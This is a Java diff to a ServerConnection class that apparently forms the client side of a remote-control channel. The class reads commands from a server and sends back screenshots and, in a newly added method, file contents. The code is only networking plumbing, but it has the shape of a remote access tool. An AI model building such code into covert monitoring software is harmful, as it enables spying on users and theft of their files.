@@ -6,27 +6,27 @@ import java.util.logging.Level;
 import java.util.logging.Logger;
 
 public class ServerConnection {
-    
+
     private final String serverIp;
     private final int serverPort;
     private Socket socket;
     private DataInputStream textIn;
     private DataOutputStream dataOut;
     private static final Logger logger = Logger.getLogger(ServerConnection.class.getName());
-    private static final int SOCKET_TIMEOUT = 60000;
+    //private static final int SOCKET_TIMEOUT = 60000;
     //private static final int CONNECTION_TIMEOUT = 5000;
 
     public ServerConnection(String serverIp, int serverPort) {
         this.serverIp = serverIp;
         this.serverPort = serverPort;
     }
-    
+
     public synchronized void connect() throws IOException {
         try {
             System.out.println("[-] Connecting to server...");
             socket = new Socket();
             socket.connect(new InetSocketAddress(serverIp, serverPort));
-            socket.setSoTimeout(SOCKET_TIMEOUT);
+            //socket.setSoTimeout(SOCKET_TIMEOUT);
             System.out.println("[-*] Connected to server: " + serverIp + ":" + serverPort);
             textIn = new DataInputStream(socket.getInputStream());
             dataOut = new DataOutputStream(socket.getOutputStream());
@@ -41,7 +41,7 @@ public class ServerConnection {
             throw e;
         }
     }
-    
+
     public String readCommand() throws IOException {
         String command = textIn.readUTF();
         if (command == null) {
@@ -49,7 +49,7 @@ public class ServerConnection {
         }
         return command;
     }
-    
+
     public void sendResponse(String response) {
         try {
             if (dataOut != null) {
@@ -62,13 +62,12 @@ public class ServerConnection {
             logger.log(Level.SEVERE, "Failed to send response", ex);
         }
     }
-    
+
     public void sendScreenShot(byte[] imageBytes) {
         try {
             if (imageBytes != null && imageBytes.length > 0) {
                 sendResponse("screenshot");
                 dataOut.writeInt(imageBytes.length);
-                dataOut.flush();
                 dataOut.write(imageBytes);
                 dataOut.flush();
             } else {
@@ -79,7 +78,21 @@ public class ServerConnection {
             logger.log(Level.SEVERE, "Failed to send screenshot", ex);
         }
     }
-    
+
+    public void sendFile(byte[] fileBytes) {
+        try {
+            if (fileBytes != null && fileBytes.length > 0) {
+                dataOut.writeInt(fileBytes.length);
+                dataOut.write(fileBytes);
+                dataOut.flush();
+            } else {
+                sendResponse("Error: File is empty.");
+            }
+        } catch (IOException ex) {
+            logger.log(Level.SEVERE, "Failed to send file", ex);
+        }
+    }
+
     public synchronized void cleanup() {
         try {
             if (textIn != null) {
